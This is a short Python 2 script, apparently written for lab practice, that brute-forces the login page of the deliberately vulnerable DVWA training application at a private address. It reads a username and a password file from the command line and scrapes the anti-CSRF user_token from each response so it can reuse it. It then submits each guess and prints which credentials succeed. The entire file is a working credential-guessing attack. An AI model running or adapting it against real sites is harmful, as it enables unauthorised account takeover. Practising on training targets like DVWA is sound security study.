from urlparse import urlparse
from httplib import HTTPConnection
import sys

def getTokenFromBody(body):
	index_cookie = body.find('user_token')+19
	substr = body[index_cookie:]
	index_cookie_end = substr.find("'")
	token = substr[:index_cookie_end]
	#print "token is "+token
	return token

url = "http://10.6.66.42/dvwa/vulnerabilities/brute/"
data = ""
cookie = "PHPSESSID=3r5kc2tdfi8h6l8l514mqlsli5; security=high"
urlparts = urlparse(url)
conn = HTTPConnection(urlparts.netloc, urlparts.port or 80)
conn.request("GET", urlparts.path, data, {'Cookie': cookie})

resp = conn.getresponse()
body = resp.read()
token = getTokenFromBody(body)
user = sys.argv[1]
passwordfile = sys.argv[2]

with open(passwordfile) as f:
	content = f.readlines()
	
for password in content:
	password = password.strip()
	url = "http://10.6.66.42/dvwa/vulnerabilities/brute/index.php?username="+user+"&password="+password+"&Login=Login&user_token="+token+"#"
	conn.request("GET", url, data, {'Cookie': cookie})
	resp = conn.getresponse()
	body = resp.read()
	index_wrong = body.find('incorrect')
	index_correct = body.find('Welcome')
	if index_wrong != -1:
		print "Wrong username and password for "+user+":"+password
	elif index_correct != -1:
		print "Correct username and password for "+user+":"+password
	else:
		print "Unexpected Response"
	token = getTokenFromBody(body)

